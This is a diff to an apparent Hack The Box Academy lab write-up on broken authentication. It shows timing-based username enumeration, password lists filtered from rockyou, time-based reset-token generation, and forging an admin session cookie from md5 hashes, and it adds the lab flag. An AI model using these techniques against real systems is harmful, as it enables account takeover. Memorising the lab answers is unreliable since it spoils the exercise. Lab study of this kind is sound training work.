@@ -70,7 +70,7 @@ Make shure we are using `http` and not `https` in the script.
 
 Run multiple times and do an average.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ sudo python3 timing.py ~/seclists/Usernames/top-usernames-shortlist.txt
 [-] Checking account root foobar
@@ -127,7 +127,7 @@ Run multiple times and do an average.
 
 The password needs to contain at least one upper case character and a number.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ grep '[[:upper:]]' seclists/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '^.{2,12}$' | grep '[0-9]' > Downloads/custom_RockYou-50.txt
 
@@ -150,7 +150,7 @@ The list now contains 15 possible passwords.
 *Hint: Convert the displayed date to epoch time in milliseconds and use it in the script you will create.*
 
 Python script: 
-```
+```python
 #!/usr/bin/python3
 
 from hashlib import md5
@@ -176,7 +176,7 @@ for x in range(start_time, end_time + 1):
 
 Run the script to make token list.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 reset_token_time_list.py > token_list.txt
 
@@ -198,7 +198,7 @@ After inserting it in the page:
 ### Question 2:
 ![](./attachments/Pasted%20image%2020220728110513.png)
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ echo "Njg3NDYyNzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyNDA2MTYzNjE2NDY1NmQ3OTJlNjg2MTYzNmI3NDY4NjU2MjZmNzgyZTY1NzUzYTc1NmU2MjcyNjU2MTZiNjE2MjZjNjU=" | base64 -d
 687462757365723a687462757365724061636164656d792e6861636b746865626f782e65753a756e627265616b61626c65
@@ -283,7 +283,7 @@ Pass: ADn68LQfkavmHLfALDIR@1
 
 ![](./attachments/Pasted%20image%2020220728135855.png)
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ grep -x '.\{20,200\}' seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[$#@]' | grep '[0-9]$' | grep '[[:lower:]]' | grep '^[[:upper:]]' > custom_rockyou.txt
 ```
@@ -298,13 +298,39 @@ Password: `Mustang#firebird1995`
 
 Cookie part:
 
+![](Pasted%20image%2020220805184304.png)
+
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo "YWY2MTcyZGExZjM1M2E5YjliYmJhYWMzYWMxZWQ0YzQ6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI" | base64 -d
+af6172da1f353a9b9bbbaac3ac1ed4c4:434990c8a25d2be94863561ae98bd682base64: invalid input
+```
+
 ![](./attachments/Pasted%20image%2020220804112444.png)
 
 ![](./attachments/Pasted%20image%2020220804112509.png)
 
 User:role `support.us:support`
 
-**Answer:** ``
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo -n "admin" | md5sum                                                                                  
+21232f297a57a5a743894a0e4a801fc3  -
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo -n "admin.us" | md5sum
+5e2dea20edeb5de788969bd9d441aaa9  -
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo -n "5e2dea20edeb5de788969bd9d441aaa9:21232f297a57a5a743894a0e4a801fc3" | base64
+NWUyZGVhMjBlZGViNWRlNzg4OTY5YmQ5ZDQ0MWFhYTk6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
+```
+
+Final cookie: `NWUyZGVhMjBlZGViNWRlNzg4OTY5YmQ5ZDQ0MWFhYTk6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D`
+
+![](Pasted%20image%2020220805190101.png)
+
+**Answer:** `HTB{1_br0k3_4uth_4_br34kf4st}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
